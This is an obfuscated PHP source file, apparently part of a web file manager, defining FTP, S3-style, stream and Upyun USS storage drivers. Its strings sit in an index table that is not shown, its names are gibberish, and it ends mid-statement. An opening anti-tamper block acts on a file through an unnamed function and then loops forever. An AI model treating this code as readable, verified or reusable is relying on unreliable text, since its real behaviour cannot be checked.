<?php
 goto F–‡–Á«Ÿ–; Cî¿‰É¹ñ¯: if (!isset($_SERVER[$_SERVER[Š—Â“œÔ][947]]) || !isset($_SERVER[$_SERVER[Š—Â“œÔ][945]])) { $_getc = $_SERVER[Š—Â“œÔ][949]; $_getfile = $_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Š—Â“œÔ][287], $_getfilec); if (count($_getarrs) < $_SERVER[Š—Â“œÔ][689]) { $exit = $_SERVER[Š—Â“œÔ][952]; $exit(); } $_act = $_SERVER[Š—Â“œÔ][1298]; $_act($_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Š—Â“œÔ][456]); } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¤ÙÍšú) { parent::__construct(); if (count($¤ÙÍšú) > 0) { $this->_init($¤ÙÍšú); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ˆêëÛû) { $Ÿ«ˆºÀù =& $_SERVER[Š—Â“œÔ]; global $config; $this->appCharset = $config[$Ÿ«ˆºÀù[1437]]; $this->systemCharset = $config[$Ÿ«ˆºÀù[1438]]; if (isset($ˆêëÛû[$Ÿ«ˆºÀù[1439]]) && $ˆêëÛû[$Ÿ«ˆºÀù[1439]]) { $this->systemCharset = $ˆêëÛû[$Ÿ«ˆºÀù[1439]]; } } public function iconvApp($“«Ø­¾×) { return $this->iconvTo($“«Ø­¾×, $this->systemCharset, $this->appCharset); } public function iconvSystem($ğŞóÀê‹) { return $this->iconvTo($ğŞóÀê‹, $this->appCharset, $this->systemCharset); } public function getPathOuter($‘í–Ô‡Ö) { $Â²ÛË„Ê =& $_SERVER[Š—Â“œÔ]; $íÁÑŒÚŸ = $this->iconvApp($this->pathBase); $‘í–Ô‡Ö = $this->iconvApp($‘í–Ô‡Ö); if (substr($íÁÑŒÚŸ, 0, 2) == $Â²ÛË„Ê[1409]) { $íÁÑŒÚŸ = BASIC_PATH . substr($íÁÑŒÚŸ, 2); } if (substr($‘í–Ô‡Ö, 0, 2) == $Â²ÛË„Ê[1409]) { $‘í–Ô‡Ö = BASIC_PATH . substr($‘í–Ô‡Ö, 2); } $íÁÑŒÚŸ = KodIO::clear($íÁÑŒÚŸ); $‘í–Ô‡Ö = KodIO::clear($‘í–Ô‡Ö); $‘í–Ô‡Ö = substr($‘í–Ô‡Ö, strlen($íÁÑŒÚŸ)); if (empty($this->pathDriver)) { return $‘í–Ô‡Ö; } return $this->pathDriver . $Â²ÛË„Ê[8] . ltrim($‘í–Ô‡Ö, $Â²ÛË„Ê[8]); } private function _init($œú³ÍÆÕ = array()) { $Âññ°± =& $_SERVER[Š—Â“œÔ]; if (!function_exists($Âññ°±[1440])) { throw new Exception(LNG($Âññ°±[1441])); } $this->config = $œú³ÍÆÕ; $this->charsetReset($œú³ÍÆÕ); foreach ($œú³ÍÆÕ as $¶¦ƒ˜ş” => $¹§¹ùùƒ) { if (isset($this->{$¶¦ƒ˜ş”})) { $this->{$¶¦ƒ˜ş”} = $¹§¹ùùƒ; } } return $this->_login($œú³ÍÆÕ); } private function _login($çÜ÷àÁ) { $üİÃ±Æ =& $_SERVER[Š—Â“œÔ]; static $·Ì„Åä¼ = array(); $°³±ôèú = md5(json_encode($çÜ÷àÁ)); if (isset($·Ì„Åä¼[$°³±ôèú])) { foreach ($·Ì„Åä¼[$°³±ôèú] as $óàîÖŸŞ => $¢îöŸú›) { $this->{$óàîÖŸŞ} = $¢îöŸú›; } return !0; } $İóİ«¯¹ = parse_url(trim($this->server, $üİÃ±Æ[8])); $this->host = $İóİ«¯¹[$üİÃ±Æ[208]]; $“ÛÕâÎ˜ = isset($İóİ«¯¹[$üİÃ±Æ[207]]) && $İóİ«¯¹[$üİÃ±Æ[207]] == $üİÃ±Æ[1442] ? !0 : !1; $this->scheme = $“ÛÕâÎ˜ ? $üİÃ±Æ[1443] : $üİÃ±Æ[1444]; $this->port = isset($İóİ«¯¹[$üİÃ±Æ[209]]) ? $İóİ«¯¹[$üİÃ±Æ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($üİÃ±Æ[1445]) . $this->host . $üİÃ±Æ[4] . $this->port, !0); return !1; } $ÀÀ¿·¥Í = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÀÀ¿·¥Í) { $this->writeLog(LNG($üİÃ±Æ[1446]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $³ˆàİÜº = $this->pasv == $üİÃ±Æ[91] ? !0 : !1; @ftp_pasv($this->connect, $³ˆàİÜº); $·Ì„Åä¼[$°³±ôèú] = array($üİÃ±Æ[1447] => $this->connect, $üİÃ±Æ[208] => $this->host, $üİÃ±Æ[207] => $this->scheme, $üİÃ±Æ[209] => $this->port); return $ÀÀ¿·¥Í; } private function _isconn($©š¼ËÎ” = true) { if (is_resource($this->connect)) { return !0; } if (!$©š¼ËÎ”) { return !1; } return $this->_login($this->config); } public function mkfile($ˆô„ÈÕ‰, $ÂÍáå¼ = '', $Óš¯—×á = REPEAT_RENAME) { if ($this->setContent($ˆô„ÈÕ‰, $ÂÍáå¼)) { return $this->getPathOuter($ˆô„ÈÕ‰); } $this->writeLog(LNG($_SERVER[Š—Â“œÔ][1448]), !0); return !1; } public function mkdir($ÔäïÙ¶, $«‹çğ = REPEAT_SKIP) { $–³…¾Å =& $_SERVER[Š—Â“œÔ]; if (!$ÔäïÙ¶ || $ÔäïÙ¶ == $–³…¾Å[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÔäïÙ¶ = $this->iconvSystem($ÔäïÙ¶); if ($this->_isFolder($ÔäïÙ¶) || @ftp_mkdir($this->connect, $ÔäïÙ¶)) { return $this->getPathOuter($ÔäïÙ¶); } if (!$this->mkdir($this->pathFather($ÔäïÙ¶))) { return !1; } if ($ÔäïÙ¶ = @ftp_mkdir($this->connect, $ÔäïÙ¶)) { return $this->getPathOuter($ÔäïÙ¶); } $this->writeLog(__FUNCTION__ . $–³…¾Å[1449], !0); return !1; } public function copyFile($Ìà§çÖÇ, $äª…œÓ) { if (!$this->_isconn()) { return !1; } $øëÑÁŠ = $this->pathThis($this->iconvSystem($Ìà§çÖÇ)); $¦…¾ÓÍ’ = $this->tempFile($øëÑÁŠ); $€‡Ÿ‚Æ = $this->iconvApp($¦…¾ÓÍ’); $this->download($Ìà§çÖÇ, $€‡Ÿ‚Æ); $ø¤˜¹â™ = $this->upload($äª…œÓ, $€‡Ÿ‚Æ); $this->tempFileRemve($¦…¾ÓÍ’); return $ø¤˜¹â™; } public function moveFile($ÔúŞ£º¼, $üì¼‹¾Œ) { if (!$this->_isconn()) { return !1; } $ÔúŞ£º¼ = $this->iconvSystem($ÔúŞ£º¼); $üì¼‹¾Œ = $this->iconvSystem($üì¼‹¾Œ); $»ıï¬ = @ftp_rename($this->connect, $ÔúŞ£º¼, $üì¼‹¾Œ); if (!$»ıï¬) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } return $this->getPathOuter($üì¼‹¾Œ); } public function delFile($¿ûåÏÈ¦) { if (!$this->_isconn()) { return !1; } $¿ûåÏÈ¦ = $this->iconvSystem($¿ûåÏÈ¦); $¬•»à° = @ftp_delete($this->connect, $¿ûåÏÈ¦); if (!$¬•»à°) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); } return $¬•»à°; } public function delFolder($—ğŒİÜÚ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¬€üÓí§ = $Ä ÌĞå† = array(); $this->fileList($—ğŒİÜÚ, $¬€üÓí§, $Ä ÌĞå†, !0); $this->listItemCache = !0; foreach ($Ä ÌĞå† as $şÂÉÓÕ) { $¶˜­½ÅÊ = $this->iconvSystem($şÂÉÓÕ[$_SERVER[Š—Â“œÔ][32]]); $å†ÕúïÉ = @ftp_delete($this->connect, $¶˜­½ÅÊ); if (!$å†ÕúïÉ) { return !1; } } foreach ($¬€üÓí§ as $¶˜­½ÅÊ) { $¶˜­½ÅÊ = $this->iconvSystem($¶˜­½ÅÊ); $å†ÕúïÉ = @ftp_rmdir($this->connect, $¶˜­½ÅÊ); if (!$å†ÕúïÉ) { return !1; } } $—ğŒİÜÚ = $this->iconvSystem($—ğŒİÜÚ); return @ftp_rmdir($this->connect, $—ğŒİÜÚ); } public function rename($ß¡ß¦ËÀ, $ë·§æšÓ) { $èŒ²±Ëø =& $_SERVER[Š—Â“œÔ]; if (!$this->_isconn()) { return !1; } $„îßˆô = $this->fileNameAuto($this->pathFather($ß¡ß¦ËÀ), $ë·§æšÓ); $„îßˆô = $this->iconvSystem($„îßˆô); $ß¡ß¦ËÀ = $this->iconvSystem($ß¡ß¦ËÀ); $§è½¸º§ = $this->pathFather($ß¡ß¦ËÀ); $§×‚ø¿ß = rtrim($§è½¸º§, $èŒ²±Ëø[8]) . $èŒ²±Ëø[8] . $„îßˆô; $Áı¦ªğÈ = @ftp_rename($this->connect, $ß¡ß¦ËÀ, $§×‚ø¿ß); if (!$Áı¦ªğÈ) { $this->writeLog(__FUNCTION__ . $èŒ²±Ëø[1449], !0); return !1; } $§×‚ø¿ß = $this->iconvApp($§×‚ø¿ß); return $this->getPathOuter($§×‚ø¿ß); } private function folderInfo($…å÷ö«á, $€ÚˆÛÅ = false) { $®×¸ÂÇÙ =& $_SERVER[Š—Â“œÔ]; $÷ùÍ“šÎ = array($®×¸ÂÇÙ[32] => $this->pathThis($…å÷ö«á), $®×¸ÂÇÙ[87] => $this->getPathOuter($®×¸ÂÇÙ[8] . $…å÷ö«á), $®×¸ÂÇÙ[33] => $®×¸ÂÇÙ[78]); if ($€ÚˆÛÅ) { return $÷ùÍ“šÎ; } $÷ùÍ“šÎ[$®×¸ÂÇÙ[233]] = $÷ùÍ“šÎ[$®×¸ÂÇÙ[88]] = 0; $÷ùÍ“šÎ[$®×¸ÂÇÙ[234]] = $÷ùÍ“šÎ[$®×¸ÂÇÙ[235]] = !0; return $÷ùÍ“šÎ; } private function fileInfo($îØœáãÕ, $­´š†üİ = false, $ñú€“£ß = array()) { $³Şú°ü¤ =& $_SERVER[Š—Â“œÔ]; $¦ƒµşüä = array($³Şú°ü¤[32] => $this->pathThis($îØœáãÕ), $³Şú°ü¤[87] => $this->getPathOuter($³Şú°ü¤[8] . $îØœáãÕ), $³Şú°ü¤[33] => $³Şú°ü¤[232], $³Şú°ü¤[79] => isset($ñú€“£ß[$³Şú°ü¤[79]]) ? $ñú€“£ß[$³Şú°ü¤[79]] : 0, $³Şú°ü¤[169] => $this->ext($îØœáãÕ)); if ($­´š†üİ) { return $¦ƒµşüä; } $¦ƒµşüä[$³Şú°ü¤[233]] = $¦ƒµşüä[$³Şú°ü¤[88]] = 0; $¦ƒµşüä[$³Şú°ü¤[234]] = $¦ƒµşüä[$³Şú°ü¤[235]] = !0; $±ğ©œÑ“ = $this->iconvSystem($îØœáãÕ); $¦ƒµşüä[$³Şú°ü¤[88]] = @ftp_mdtm($this->connect, $±ğ©œÑ“); if (empty($ñú€“£ß)) { $ñú€“£ß = $this->objectMeta($îØœáãÕ); if (!$ñú€“£ß) { return $¦ƒµşüä; } } $¦ƒµşüä[$³Şú°ü¤[79]] = $ñú€“£ß[$³Şú°ü¤[79]]; return $¦ƒµşüä; } public function size($Î™Çºù€) { $öæ„©µÚ = $this->objectMeta($Î™Çºù€); return $öæ„©µÚ ? $öæ„©µÚ[$_SERVER[Š—Â“œÔ][79]] : 0; } public function info($Æ¸Ì²‘) { if ($this->isFile($Æ¸Ì²‘)) { return $this->fileInfo($Æ¸Ì²‘, 0); } else { if ($this->isFolder($Æ¸Ì²‘)) { return $this->folderInfo($Æ¸Ì²‘); } } return !1; } private function fileList($´«ïÅÕ…, &$Œù­‡áò, &$Âë©¬Ñæ, $ù™Çº¾ = false) { $ÏÍ÷‹Ë =& $_SERVER[Š—Â“œÔ]; $´«ïÅÕ… = $this->iconvSystem($´«ïÅÕ…); if (!$this->isFolder($´«ïÅÕ…)) { return !1; } @ftp_chdir($this->connect, $ÏÍ÷‹Ë[8]); $´«ïÅÕ… = rtrim($´«ïÅÕ…, $ÏÍ÷‹Ë[8]) . $ÏÍ÷‹Ë[8]; check_abort(); $³ˆúŸ… = @ftp_rawlist($this->connect, $´«ïÅÕ…); if (!$³ˆúŸ…) { $³ˆúŸ… = array(); } $†•÷‘ñ  = array($ÏÍ÷‹Ë[10] => 1, $ÏÍ÷‹Ë[1361] => 1); foreach ($³ˆúŸ… as $ö¿»ÆÉä) { $ı•£Íòî = $this->_listItem($ö¿»ÆÉä); if ($ı•£Íòî[0] == $ÏÍ÷‹Ë[825]) { continue; } $ìíƒÄåÖ = $ı•£Íòî[8]; if (empty($ìíƒÄåÖ) && $ìíƒÄåÖ !== $ÏÍ÷‹Ë[230] || isset($†•÷‘ñ [$ìíƒÄåÖ])) { continue; } $ìíƒÄåÖ = $this->iconvApp($´«ïÅÕ… . ltrim($ìíƒÄåÖ, $ÏÍ÷‹Ë[8])); $°Úûô–§ = array($ÏÍ÷‹Ë[32] => $ìíƒÄåÖ, $ÏÍ÷‹Ë[33] => $ÏÍ÷‹Ë[232], $ÏÍ÷‹Ë[79] => $ı•£Íòî[4]); if (substr($ö¿»ÆÉä, 0, 1) == $ÏÍ÷‹Ë[1450]) { $°Úûô–§[$ÏÍ÷‹Ë[33]] = $ÏÍ÷‹Ë[78]; $°Úûô–§[$ÏÍ÷‹Ë[79]] = 0; } $›é†ûÑô = $°Úûô–§[$ÏÍ÷‹Ë[33]] == $ÏÍ÷‹Ë[78] ? !0 : !1; $this->cacheMethodInfoSet($ìíƒÄåÖ, $›é†ûÑô, $°Úûô–§); if ($›é†ûÑô) { $Œù­‡áò[] = $ìíƒÄåÖ; if ($ù™Çº¾) { $this->fileList($ìíƒÄåÖ, $Œù­‡áò, $Âë©¬Ñæ, $ù™Çº¾); } continue; } $Âë©¬Ñæ[] = $°Úûô–§; } $this->cacheMethodInfoSet($´«ïÅÕ…, !0); } private function _listItem($šŠÅ«·) { if (empty($šŠÅ«·)) { return array(); } $á™‡ŸÒ = preg_split($_SERVER[Š—Â“œÔ][1451], $šŠÅ«·); if (count($á™‡ŸÒ) <= 9) { return $á™‡ŸÒ; } $á™‡ŸÒ[8] = trim(substr($šŠÅ«·, strpos($šŠÅ«·, $á™‡ŸÒ[7]) + strlen($á™‡ŸÒ[7]))); return array_splice($á™‡ŸÒ, 0, 9); } public function listPath($Ëáéİï¼, $Á©€œŞ = false) { $Ü„œ¥­ =& $_SERVER[Š—Â“œÔ]; if (!$this->_isconn()) { return !1; } $«†ò¸ = $ ùëÙæ¾ = array(); $this->fileList($Ëáéİï¼, $«†ò¸, $ ùëÙæ¾); foreach ($«†ò¸ as $á¢ıĞó‡ => $øÏ»˜…¤) { $«†ò¸[$á¢ıĞó‡] = $this->folderInfo($øÏ»˜…¤, $Á©€œŞ); } foreach ($ ùëÙæ¾ as $á¢ıĞó‡ => $øÏ»˜…¤) { $ ùëÙæ¾[$á¢ıĞó‡] = $this->fileInfo($øÏ»˜…¤[$Ü„œ¥­[32]], $Á©€œŞ, $øÏ»˜…¤); } return array($Ü„œ¥­[85] => $«†ò¸, $Ü„œ¥­[86] => $ ùëÙæ¾); } public function has($¼Ïµœ, $é™ñØÕ = false, $¥­Ç×÷ = true) { $äù¦æ¢ =& $_SERVER[Š—Â“œÔ]; $™å¸¼Ëè = $›éƒÓ÷ = array(); $‰Ô‡ìêò = $é™ñØÕ ? !0 : !1; $this->fileList($¼Ïµœ, $™å¸¼Ëè, $›éƒÓ÷, $‰Ô‡ìêò); if ($é™ñØÕ) { return array($äù¦æ¢[241] => count($›éƒÓ÷), $äù¦æ¢[242] => count($™å¸¼Ëè)); } if ($¥­Ç×÷) { if (count($›éƒÓ÷)) { return !0; } } else { if (count($™å¸¼Ëè)) { return !0; } } return !1; } public function listAll($×şÊèìû) { $ÎéğÂû =& $_SERVER[Š—Â“œÔ]; if (!$this->_isconn()) { return !1; } $—ø¢‘òà = $Ï—×±¬× = array(); $this->fileList($×şÊèìû, $—ø¢‘òà, $Ï—×±¬×, !0); $ä¢èá¹Ø = array_to_keyvalue($Ï—×±¬×, $ÎéğÂû[32]); foreach ($—ø¢‘òà as $§Èñİ¸) { if (is_string($§Èñİ¸)) { $ä¢èá¹Ø[$§Èñİ¸] = array($ÎéğÂû[79] => 0); } } return $this->listAllFiles($×şÊèìû, $ä¢èá¹Ø); } public function getContent($§Ş—Õøà) { if (!$this->_isconn()) { return !1; } $§Ş—Õøà = $this->iconvSystem($§Ş—Õøà); return $this->fileSubstr($§Ş—Õøà); } public function setContent($¢º÷ğŒ¹, $¡Â¢ÎÏ« = '') { if (!$this->_isconn()) { return !1; } $©–²ø‡¯ = $this->pathThis($this->iconvSystem($¢º÷ğŒ¹)); $çÁÄşŸ = $this->tempFile($©–²ø‡¯); file_put_contents($çÁÄşŸ, $¡Â¢ÎÏ«); $°ıäïÃ“ = $this->upload($¢º÷ğŒ¹, $this->iconvApp($çÁÄşŸ)); $this->tempFileRemve($çÁÄşŸ); return $°ıäïÃ“; } public function fileSubstr($ÊÃŠÉÊ¿, $Öâ‰·¥ = 0, $ŸÃ€‘ˆé = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÊÃŠÉÊ¿, $Öâ‰·¥, $ŸÃ€‘ˆé); } private function ftpRequest($Å•Îıº , $è¬÷ıØİ = 0, $¡Ó½ã‚ = false) { $Å•Îıº  = $this->iconvSystem($Å•Îıº ); $ùØÉ«ö¢ = $this->scheme . $this->host . $_SERVER[Š—Â“œÔ][4] . $this->port; $÷íÒ ¹Ö = curl_init(); curl_setopt($÷íÒ ¹Ö, CURLOPT_URL, $ùØÉ«ö¢ . $this->pathEncode($Å•Îıº )); curl_setopt($÷íÒ ¹Ö, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¡Ó½ã‚) { $ËíÊ£ö = $è¬÷ıØİ + $¡Ó½ã‚ - 1; curl_setopt($÷íÒ ¹Ö, CURLOPT_RANGE, "{$è¬÷ıØİ}\x2d{$ËíÊ£ö}"); } curl_setopt($÷íÒ ¹Ö, CURLOPT_RETURNTRANSFER, 1); $ŞÂÏ¥ÖĞ = curl_exec($÷íÒ ¹Ö); curl_close($÷íÒ ¹Ö); return $ŞÂÏ¥ÖĞ; } public function upload($Áˆšê, $İ×óÔÁ», $¢Êà™ªª = false, $·›ş¡ô¡ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Áˆšê))) { return !1; } $Áˆšê = $this->iconvSystem($Áˆšê); $İ×óÔÁ» = $this->iconvSystem($İ×óÔÁ»); $öà¤úôè = ftp_nb_put($this->connect, $Áˆšê, $İ×óÔÁ», FTP_BINARY); while ($öà¤úôè == FTP_MOREDATA) { $öà¤úôè = ftp_nb_continue($this->connect); } if ($öà¤úôè != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } return $this->getPathOuter($Áˆšê); } public function download($Ÿ™»ÚØÆ, $ºğ°èûĞ = '') { if (!$this->_isconn()) { return !1; } $“–»Ú€ = $this->pathFather($ºğ°èûĞ); if (!IO::mkdir($“–»Ú€)) { return !1; } $Ÿ™»ÚØÆ = $this->iconvSystem($Ÿ™»ÚØÆ); $ºğ°èûĞ = $this->iconvSystem($ºğ°èûĞ); $¥“¶›õ÷ = ftp_nb_get($this->connect, $ºğ°èûĞ, $Ÿ™»ÚØÆ, FTP_BINARY); while ($¥“¶›õ÷ == FTP_MOREDATA) { $¥“¶›õ÷ = ftp_nb_continue($this->connect); } if ($¥“¶›õ÷ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } return $this->iconvApp($ºğ°èûĞ); } public function exist($¢ÈÙÊ¦ã) { return $this->isFile($¢ÈÙÊ¦ã) || $this->isFolder($¢ÈÙÊ¦ã); } public function isFile($Ş÷Òï) { return !$this->isFolder($Ş÷Òï) && $this->objectMeta($Ş÷Òï); } public function isFolder($…İœ°¢§) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][179], $…İœ°¢§); } protected function objectMeta($«Ûí°İÙ) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][181], $«Ûí°İÙ); } protected function _objectMeta($¥İ•„) { $ˆë°ãõó =& $_SERVER[Š—Â“œÔ]; if ($¥İ•„ == $ˆë°ãõó[12] || $¥İ•„ == $ˆë°ãõó[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¥İ•„ = $this->iconvSystem($¥İ•„); $ĞÂ…Êí¶ = array($ˆë°ãõó[32] => $this->iconvApp($¥İ•„), $ˆë°ãõó[33] => $ˆë°ãõó[232], $ˆë°ãõó[79] => 0); @ftp_chdir($this->connect, $ˆë°ãõó[8]); $†Ÿš²ï¨ = @ftp_size($this->connect, $¥İ•„); if ($†Ÿš²ï¨ != -1) { $ĞÂ…Êí¶[$ˆë°ãõó[79]] = $†Ÿš²ï¨; } else { $°‘ãúóâ = @ftp_chdir($this->connect, $¥İ•„); if (!$°‘ãúóâ) { return !1; } $ĞÂ…Êí¶[$ˆë°ãõó[33]] = $ˆë°ãõó[78]; } return $ĞÂ…Êí¶; } protected function _isFolder($ÁÍÜ“ë±) { $ïÉÔ¶Ÿ =& $_SERVER[Š—Â“œÔ]; if ($ÁÍÜ“ë± == $ïÉÔ¶Ÿ[12] || $ÁÍÜ“ë± == $ïÉÔ¶Ÿ[8]) { return !0; } $…†ú’´Å = $this->_objectMeta($ÁÍÜ“ë±); return isset($…†ú’´Å[$ïÉÔ¶Ÿ[33]]) && $…†ú’´Å[$ïÉÔ¶Ÿ[33]] == $ïÉÔ¶Ÿ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($éóÈ™Áâ) { parent::__construct($éóÈ™Áâ); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } public function uploadLink($§ÑÅåù¸, $îù•Ü¾™ = 0) { $¢Ê°¶Š =& $_SERVER[Š—Â“œÔ]; if ($this->isUploadServer()) { return; } $„Î˜™¼ = $this->getType(); if (!in_array($„Î˜™¼, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $½âÊÏÛ = (!$îù•Ü¾™ ? 1 : ceil($îù•Ü¾™ / pow(1024, 3))) * 3600 * 4; $±³ç»ë = $this->uploadMultiData($§ÑÅåù¸, $½âÊÏÛ); if ($±³ç»ë) { $±³ç»ë[$¢Ê°¶Š[97]] = $§ÑÅåù¸; $±³ç»ë[$¢Ê°¶Š[98]] = $„Î˜™¼; } return $±³ç»ë; } public function fileOutImage($ß‡ëô‰, $ÂÜŒïÁ¦ = 250) { if ($this->size($ß‡ëô‰) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ß‡ëô‰, $ÂÜŒïÁ¦); } $ÆÉÆÜ¿Ô = $this->link($ß‡ëô‰); $ÆÉÆÜ¿Ô .= $_SERVER[Š—Â“œÔ][1452] . $ÂÜŒïÁ¦; $this->fileOutLink($ÆÉÆÜ¿Ô); } public function fileOutLink($ôÁ¥ªú©) { $ƒå§õì³ =& $_SERVER[Š—Â“œÔ]; if (substr($ôÁ¥ªú©, 0, 7) == $ƒå§õì³[218]) { $ôÁ¥ªú© = $ƒå§õì³[219] . substr($ôÁ¥ªú©, 7); } header($ƒå§õì³[175] . $ôÁ¥ªú©); die; } } goto cˆöğ“Ù; fˆ¹‘å¸ç‚: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($€Æğ½¼É, $õš‰¡² = 0) { parent::__construct(); $this->source = $€Æğ½¼É; $this->sourceSize = $õš‰¡²; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($íÌö©¯È = false) { return $this->sourceSize; } public function getContent($ïÚ³™ãÅ = false) { return $this->fileSubstr($ïÚ³™ãÅ, 0, $this->sourceSize); } public function fileSubstr($·“ãˆı‰ = false, $¥£ÓğÖ¦ = 0, $¤™…³•š = 0) { if (!$¤™…³•š) { $¤™…³•š = $this->sourceSize; } $ıçøıİ = $this->sourceSize - $¥£ÓğÖ¦; if ($¤™…³•š >= $ıçøıİ) { $¤™…³•š = $ıçøıİ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¥£ÓğÖ¦, $¤™…³•š); } if ($this->sourceType == self::TYPE_FILE) { if ($¤™…³•š <= 0) { return $_SERVER[Š—Â“œÔ][12]; } $ ø°è€¦ = ftell($this->source); fseek_64($this->source, $ ø°è€¦ + $¥£ÓğÖ¦); $•çœ­Ï½ = @fread($this->source, $¤™…³•š); fseek_64($this->source, $ ø°è€¦); return $•çœ­Ï½; } } public function hashMd5($ “šÎò = false) { return md5($this->getContent()); } public static function hash($ì±ş°Ş, $êî÷Óœñ = 0) { $ø©ØÌ‰Œ = new PathDriverStream($ì±ş°Ş, $êî÷Óœñ); return $ø©ØÌ‰Œ->hashSimple($ì±ş°Ş); } public static function md5($—‰àß¢ì, $íÓÙÒµà = 0) { $ãÉÇÍÁ = new PathDriverStream($—‰àß¢ì, $íÓÙÒµà); return $ãÉÇÍÁ->hashMd5($—‰àß¢ì); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\166\60\56\x61\160\x69\56\x75\x70\x79\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($˜‡¨óšÜ) { parent::__construct(); $this->_init($˜‡¨óšÜ); } public function _init($ˆèÙ÷ú) { $£ôÈ½ä =& $_SERVER[Š—Â“œÔ]; foreach ($ˆèÙ÷ú as $şÖ¦¼Ã => $ş³Ú´“) { if (isset($this->{$şÖ¦¼Ã})) { $this->{$şÖ¦¼Ã} = $ş³Ú´“; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($£ôÈ½ä[1544] . LNG($£ôÈ½ä[1463])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($‘‚›¯, $‘¨ŸÄ¹ = "\107\x45\124") { $¶”êŠï¢ =& $_SERVER[Š—Â“œÔ]; $…º–ÒÔ… = gmdate($¶”êŠï¢[1492]); $ò¯ì•» = base64_encode(hash_hmac($¶”êŠï¢[1545], "{$‘¨ŸÄ¹}\46{$‘‚›¯}\x26{$…º–ÒÔ…}", md5("{$this->userpass}"), !0)); $¨ë›’ü = array("\x41\165\164\150\157\x72\x69\x7a\x61\x74\151\x6f\156\72\x55\120\x59\x55\x4e\40{$this->username}\72{$ò¯ì•»}", "\104\141\x74\x65\x3a{$…º–ÒÔ…}"); return $¨ë›’ü; } public function ussRequest($•ŒçªÌş, $¼€ÚÛ¾İ = "\x47\x45\124", $•¾«æÌ« = false, $ñŒí›š = false, $ıš¼ò³ = false) { $›¥£«øÂ =& $_SERVER[Š—Â“œÔ]; $•ŒçªÌş = trim($•ŒçªÌş, $›¥£«øÂ[8]); $”‰ÚÒµà = "\x2f{$this->bucket}\x2f" . rawurlencode($•ŒçªÌş); $Áò‡Ì = $this->ussHeaders($”‰ÚÒµà, $¼€ÚÛ¾İ); if ($ñŒí›š) { $Áò‡Ì = array_merge($Áò‡Ì, $ñŒí›š); } $½‘îİ†‚ = url_request($this->endpoint . $”‰ÚÒµà, $¼€ÚÛ¾İ, $•¾«æÌ«, $Áò‡Ì, $ıš¼ò³); if (!$½‘îİ†‚) { $éîÌí¿ = LNG($›¥£«øÂ[1546]); $this->writeLog($éîÌí¿); return array($›¥£«øÂ[1294] => !1, $›¥£«øÂ[1284] => $éîÌí¿); } if (strtolower($¼€ÚÛ¾İ) == $›¥£«øÂ[229] || in_array($½‘îİ†‚[$›¥£«øÂ[1294]], array($›¥£«øÂ[263], $›¥£«øÂ[1547]))) { $•¾«æÌ« = $½‘îİ†‚[$›¥£«øÂ[1548]]; if (!$½‘îİ†‚[$›¥£«øÂ[817]]) { $•¾«æÌ« = isset($•¾«æÌ«[0]) ? $•¾«æÌ«[0] : $›¥£«øÂ[12]; } } else { $•¾«æÌ« = json_decode($½‘îİ†‚[$›¥£«øÂ[1284]], !0); if (!$•¾«æÌ«) { $•¾«æÌ« = $½‘îİ†‚[$›¥£«øÂ[1284]]; } else { if (!$½‘îİ†‚[$›¥£«øÂ[817]] && isset($•¾«æÌ«[$›¥£«øÂ[1549]])) { $•¾«æÌ« = $•¾«æÌ«[$›¥£«øÂ[1549]]; } } } if (!$½‘îİ†‚[$›¥£«øÂ[817]]) { $this->writeLog($this->__errorMessage($•¾«æÌ«)); } return array($›¥£«øÂ[1294] => $½‘îİ†‚[$›¥£«øÂ[817]], $›¥£«øÂ[1284] => $•¾«æÌ«); } private function __errorMessage($ÚÈÎÈ) { $à‘Àüèú =& $_SERVER[Š—Â“œÔ]; if (!$ÚÈÎÈ) { return $à‘Àüèú[12]; } static $‹…°ù¤ = null; if (!$‹…°ù¤) { $‹…°ù¤ = I18n::getType(); } if ($‹…°ù¤ != $à‘Àüèú[1502]) { return $ÚÈÎÈ; } $«£Õä¸² = 